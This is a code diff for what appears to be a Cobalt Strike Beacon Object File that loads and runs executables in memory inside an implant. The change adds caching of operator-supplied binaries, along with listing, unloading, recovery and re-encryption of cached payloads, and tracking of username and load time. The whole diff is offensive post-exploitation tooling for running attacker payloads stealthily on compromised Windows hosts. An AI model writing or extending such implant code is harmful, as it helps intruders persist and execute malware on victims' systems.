@@ -12,6 +12,7 @@ int go(IN PCHAR Buffer, IN ULONG Length)
 {
     datap           parser        = { 0 };
     int             pe_length     = 0;
+    LPSTR           pe_name       = NULL;
     PVOID           pe_bytes      = 0;
     LPSTR           pe_path       = 0;
     BOOL            local         = FALSE;
@@ -25,12 +26,20 @@ int go(IN PCHAR Buffer, IN ULONG Length)
     BOOL            alloc_console = FALSE;
     BOOL            close_handles = FALSE;
     BOOL            unload_libs   = FALSE;
+    BOOL            dont_save     = FALSE;
+    BOOL            list_pes      = FALSE;
+    LPSTR           unload_pe     = NULL;
+    BOOL            recovered_pe  = FALSE;
+    LPSTR           username      = NULL;
+    LPSTR           loadtime      = NULL;
     PLIB_LOADED     libs_tmp      = NULL;
     PLIB_LOADED     libs_entry    = NULL;
     NTSTATUS        status        = STATUS_UNSUCCESSFUL;
     PLOADED_PE_INFO peinfo        = NULL;
 
     BeaconDataParse(&parser, Buffer, Length);
+    pe_name       = BeaconDataExtract(&parser, NULL);
+    pe_name       = pe_name[0] ? pe_name : NULL;
     pe_bytes      = BeaconDataExtract(&parser, &pe_length);
     pe_path       = BeaconDataExtract(&parser, NULL);
     pe_path       = pe_path[0] ? pe_path : NULL;
@@ -45,6 +54,14 @@ int go(IN PCHAR Buffer, IN ULONG Length)
     alloc_console = BeaconDataInt(&parser);
     close_handles = BeaconDataInt(&parser);
     unload_libs   = BeaconDataInt(&parser);
+    dont_save     = BeaconDataInt(&parser);
+    list_pes      = BeaconDataInt(&parser);
+    unload_pe     = BeaconDataExtract(&parser, NULL);
+    unload_pe     = unload_pe[0] ? unload_pe : NULL;
+    username      = BeaconDataExtract(&parser, NULL);
+    username      = username[0] ? username : NULL;
+    loadtime      = BeaconDataExtract(&parser, NULL);
+    loadtime      = loadtime[0] ? loadtime : NULL;
 
     peinfo = intAlloc(sizeof(LOADED_PE_INFO));
 
@@ -58,16 +75,56 @@ int go(IN PCHAR Buffer, IN ULONG Length)
     peinfo->alloc_console = alloc_console;
     peinfo->unload_libs   = unload_libs;
 
-    if (!pe_path && !pe_length)
+    if (list_pes)
+    {
+        list_saved_pes();
+        goto Cleanup;
+    }
+
+    if (unload_pe)
+    {
+        if (remove_saved_pe(unload_pe))
+        {
+            PRINT("removed %s", unload_pe);
+            goto Cleanup;
+        }
+        else
+        {
+            PRINT_ERR("failed to remove %s", unload_pe);
+            goto Cleanup;
+        }
+    }
+
+    // if no PE was provided, go to cleanup
+    if (!pe_name && !pe_path && !pe_length)
         goto Cleanup;
 
-    if (local)
+    // the PE was provided by the operator
+    if (pe_bytes && pe_length)
+    {
+        if (!dont_save)
+            save_pe_info(pe_name, pe_bytes, pe_length, username, loadtime);
+    }
+    // read PE from local filesystem
+    else if (local)
     {
         if (!read_local_pe(pe_path, &pe_bytes, &pe_length))
         {
-            PRINT_ERR("failed to load local binary");
+            PRINT_ERR("failed to load %s", pe_path);
             goto Cleanup;
         }
+        if (!dont_save)
+            save_pe_info(pe_name, pe_bytes, pe_length, username, loadtime);
+    }
+    // recover executable from saved PEs
+    else
+    {
+        if (!get_saved_pe(pe_name, &pe_bytes, &pe_length))
+        {
+            PRINT_ERR("failed to load %s from saved binaries", pe_name);
+            goto Cleanup;
+        }
+        recovered_pe = TRUE;
     }
 
     if (!load_pe(pe_bytes, pe_length, peinfo))
@@ -95,11 +152,14 @@ int go(IN PCHAR Buffer, IN ULONG Length)
     }
 
 Cleanup:
-    if (pe_bytes)
-        memset(pe_bytes, 0, pe_length);
+    if (recovered_pe)
+        reencrypt_pe(pe_name);
 
     if (local && pe_bytes)
+    {
+        memset(pe_bytes, 0, pe_length);
         intFree(pe_bytes);
+    }
 
     if (peinfo && peinfo->hHwBp1)
         remove_hwbp_handler(peinfo->hHwBp1);
@@ -136,7 +196,7 @@ Cleanup:
             intFree(peinfo->Handles);
         }
 
-        BeaconRemoveValue(HANDLE_INFO_KEY);
+        BeaconRemoveValue(NC_HANDLE_INFO_KEY);
     }
 
     if (peinfo && peinfo->pe_base)
